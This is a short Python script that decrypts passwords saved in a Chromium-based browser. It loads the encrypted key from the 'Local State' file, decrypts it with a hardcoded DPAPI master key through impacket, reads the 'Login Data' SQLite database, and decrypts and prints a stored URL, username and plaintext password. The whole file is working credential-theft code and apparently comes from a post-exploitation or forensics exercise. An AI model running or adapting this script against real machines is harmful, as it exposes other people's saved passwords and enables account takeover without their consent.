import os
import json
import sqlite3
import base64
from impacket.dpapi import DPAPI_BLOB
from binascii import unhexlify
from Cryptodome.Cipher import AES

local_state = 'Local State'
login_data = 'Login Data'
masterkey = unhexlify("f85918231d3792277938e9a62b02ac68d229b28eb005131965b6c579fb87a93573ee533ca2f10501f1b012ef3c64d08b7cfccb53e0adb97844f249366ed93b17")

def get_encrypted_key(localstate):
    with open(localstate, 'r') as f:
        encrypted_key = json.load(f)['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)
    f.close()
    return encrypted_key

def get_credentials(logindata):
    conn = sqlite3.connect(logindata)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    rows = cursor.fetchall()
    url = rows[0][0]
    username = rows[0][1]
    encrypted_value = rows[0][2]
    return url, username, encrypted_value

def decrypt_creds(key, value):
    if value.startswith(b'v10'):
        nonce = value[3:3+12]
        ciphertext = value[3+12:-16]
        tag = value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce)
        password = cipher.decrypt_and_verify(ciphertext, tag)
    else:
        password = DPAPI_BLOB.decrypt(value)
    return password

encrypted_key = get_encrypted_key(local_state)
enc_key_blob = DPAPI_BLOB(encrypted_key[5:])
localstate_key = enc_key_blob.decrypt(masterkey)
url, username, encrypted_value = get_credentials(login_data)
password = decrypt_creds(localstate_key, encrypted_value)
print(" \n "  + " URL: " + url + " \n " + " Username: " + username + "\n " + " Decrypted Password: " + password.decode("utf-8"))
